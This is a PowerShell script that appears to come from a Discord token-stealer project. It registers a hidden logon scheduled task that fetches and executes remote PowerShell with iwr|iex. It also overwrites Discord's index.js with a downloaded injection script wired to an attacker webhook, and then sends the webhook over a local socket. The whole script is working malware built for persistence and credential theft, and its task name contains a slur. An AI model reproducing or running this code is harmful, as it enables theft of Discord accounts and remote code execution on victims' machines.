$webhook = "YOUR_WEBHOOK_HERE"

$task_name = "account6666niiggggagay"
New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/main.ps1')|iex`",0)(window.close)"
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force | Out-Null
Write-Host "[!] Persistence Added" -ForegroundColor Green

$locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
$discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")

foreach ($path in $discPaths) {
    $skibidipath = Join-Path $locAppData $path
    if (-not (Test-Path $skibidipath)) {
        continue
    }
    Get-ChildItem $skibidipath -Recurse | ForEach-Object {
        if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
            $files = Get-ChildItem $_.FullName
            foreach ($file in $files) {
                if ($file.Name -eq "index.js") {
                    $webClient = New-Object System.Net.WebClient
                    $content = $webClient.DownloadString("https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/injection.js")
                    if ($content -ne "") {
                        $replacedContent = $content -replace "%WEBHOOK%", $webhook
                        $replacedContent | Set-Content -Path $file.FullName -Force
                    }
                }
            }
        }
    }
}

Write-Host "[!] Discord injection" -ForegroundColor blue

$serverIp = "127.0.0.1"
$port = 8666

# Tạo socket TCP/IP
$listener = [System.Net.Sockets.TcpListener]$port
$listener.Start()
Write-Host "Server đang lắng nghe trên cổng $port..."

# Chấp nhận kết nối
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()

# Gửi dữ liệu đến client
$message = "$webhook"
$bytes = [System.Text.Encoding]::UTF8.GetBytes($message)
$stream.Write($bytes, 0, $bytes.Length)
Write-Host "Đã gửi tin nhắn: $message"

# Đóng kết nối
$stream.Close()
$client.Close()
$listener.Stop()
